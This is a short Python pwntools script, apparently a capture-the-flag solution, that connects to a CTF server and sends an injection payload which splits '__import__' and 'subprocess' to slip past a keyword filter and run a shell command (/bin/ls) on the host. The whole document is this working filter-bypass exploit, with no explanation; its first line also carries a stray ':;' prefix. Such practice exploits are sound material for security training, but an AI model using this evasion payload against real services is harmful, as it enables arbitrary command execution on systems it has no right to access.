:;rom pwn import *

r = remote('ctf.j0n9hyun.xyz', 9002)

test = '"__im port__(\'subpro\'+\'cess\').call([\'/bin/ls\', \'.\'])".replace(" ", "")'

r.recv()
r.sendline(test)
r.recv()
